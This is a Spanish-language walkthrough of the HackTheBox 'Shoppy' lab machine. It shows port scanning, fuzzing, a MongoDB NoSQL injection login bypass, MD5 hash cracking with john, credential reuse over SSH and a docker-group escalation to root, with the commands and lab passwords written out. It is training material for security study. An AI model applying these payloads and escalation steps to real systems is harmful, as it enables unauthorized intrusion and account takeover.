---
title: HackTheBox - Shoppy
categories: [Linux]
tags: [HackTheBox]
image: shoppy.png 
img_path: /assets/HTB/Shoppy/
---

En este post voy a explicar como resolver la máquina Shoppy de [Hack The Box](https://app.hackthebox.com/machines/Shoppy), en la cual vamos a estar bypasseando un panel de login mediante una ```inyección NoSQL``` y para la escalada de privilegio nos aprovecharemos de que estamos en el grupo ```Docker```.

## Escaneo de puertos

```
# nmap -p- -sS --min-rate 5000 -sCV -oN nmap -n -Pn 10.10.11.180
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-12 13:35 -03
Nmap scan report for 10.10.11.180
Host is up (0.51s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp   open  http     nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Si intentamos ingresar al servidor web que está corriendo en el puerto 80, nos redirigirá a ```shoppy.htb```, vamos a agregarlo a nuestro archivo ```/etc/hosts```.

```
$ echo "10.10.11.180   shoppy.htb" >> /etc/hosts
```

# Enumeración

Al ingresar a ```shoppy.htb``` veremos esto.

<img src="shoppy-pagina.png">

Si hacemos fuzzing, descubriremos un directorio llamado ```/admin``` el cual nos redirigirá a ```/login```.

```
$ dirsearch -u http://shoppy.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/onyx/.dirsearch/reports/shoppy.htb/-_22-12-12_14-17-42.txt

Error Log: /home/onyx/.dirsearch/logs/errors-22-12-12_14-17-42.log

Target: http://shoppy.htb/

[14:17:43] Starting:
[14:17:46] 302 -   28B  - /admin  ->  /login
[14:17:46] 200 -    1KB - /login
```

Si lo observamos desde la web podemos ver un panel para iniciar sesión.

<img src="shoppy-login.png">

Este panel los podemos bypassear haciendo uso de la siguiente ```inyección NoSQL``` de ```MongoDB```: ```admin'||'1==1```.

<img src="inyeccion-nosql.png">

Una vez que hemos iniciado sesión, vemos un panel de administración, si ponemos el payload anteriormente usado para bypassear el panel de login en el buscador nos da una opción de exportar el resultado, en este resultado veremos 2 usuarios y sus respectivos hashes, los cuales vamos a intentar romper usando la herramienta john.

<img src="export-data.png">

```
$ echo "admin:62db0e93d6d6a999a66ee67a" > hashes
$ echo "josh:6ebcea65320589ca4f2f1ce039975995" >> hashes
$ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
remembermethisway (josh)
1g 0:00:00:00 DONE (2022-12-12 14:43) 14.28g/s 11602Kp/s 11602Kc/s 11602KC/s renato1989..reiji
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Sí hacemos fuzzing para descubrir subdominios, encontraremos el siguiente: ```mattermost.shoppy.htb```, este subdominio también debemos agregarlo al archivo ```/etc/hosts```

```
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" -fs 169 -t 100

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.shoppy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 169
________________________________________________

mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 387ms]
```
# Ganada de acceso

Si le echamos un vistazo, podremos ver que hay otro ```panel de login```, en el cual ```podemos utilizar las credenciales anteriormente obtenidas```, una vez estemos conectados veremos una conversación en la cual nos dan las ```credenciales``` para conectarnos por ```SSH```.

<img src="credenciales-ssh.png">

```
$ ssh jaeger@10.10.11.180
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.180' (ED25519) to the list of known hosts.
jaeger@10.10.11.180's password: Sh0ppyBest@pp!


Last login: Mon Dec 12 12:07:16 2022 from 10.10.16.26
jaeger@shoppy:~$ cat user.txt
a3d**************************1f3
```

# Enumeración del sistema
Si listamos nuestros privilegios de sudoers, veremos que podemos ejecutar el binario ```/home/deploy/password-manager``` como el usuario ```deploy```.

```
jaeger@shoppy:~$ sudo -l
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager

jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: 1234
Access denied! This incident will be reported !
```

Si le hacemos un cat al binario, y ordenamos el output, veremos que la contraseña se filtra, la cual es ```Sample```.

```
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

Al usar la contraseña filtrada, el programa nos reveló la contraseña del usuario deploy, vamos a convertirnos en ese usuario.  

```
jaeger@shoppy:~$ su deploy
Password: Deploying@pp!
deploy@shoppy:/home/jaeger$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```
# Escalada de privilegios

Viendo el output del comando id, vemos que estamos en el grupo ```docker```, si lo buscamos en la página de [GTFObins](https://gtfobins.github.io/gtfobins/docker/#shell) podemos ver que hay una manera de lanzarnos una shell como el usuario root.

```
deploy@shoppy:/home/jaeger$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)

deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# cat /root/root.txt
3e1**************************7b1
```
